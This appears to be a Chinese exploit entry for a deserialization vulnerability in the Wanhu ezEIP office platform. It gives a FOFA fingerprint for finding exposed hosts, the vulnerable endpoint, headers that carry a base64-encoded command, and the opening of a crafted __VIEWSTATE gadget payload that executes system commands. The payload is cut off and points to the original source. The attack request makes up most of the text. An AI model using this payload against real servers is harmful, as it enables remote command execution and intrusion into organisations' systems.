# 万户协同办公平台ezEIPsuccess存在反序列化漏洞

- **系统**：万户协同办公平台　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="万户网络-ezEIP"`
- **请求**：`POST /member/success.aspx HTTP/1.1`

**请求体 / payload**
```
SID的值为base64编码后的内容，如下为执行whoami命令
Host:
SID: ZGly
Content-Type: application/x-www-form-urlencoded
TYPE: C
__VIEWSTATE=%2FwEyiGEAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAV1N5c3RlbS5XaW5kb3dzLkZvcm1zLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAIVN5c3RlbS5XaW5kb3dzLkZvcm1zLkF4SG9zdCtTdGF0ZQEAAAARUHJvcGVydHlCYWdCaW5hcnkHAgIAAAAJAwAAAA8DAAAAxy8AAAIAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAQBAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DA…（脚本共 16807 字，完整版见原文）
```

**其他**
- 万户协同办公平台 ezEIP success存在反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezEIP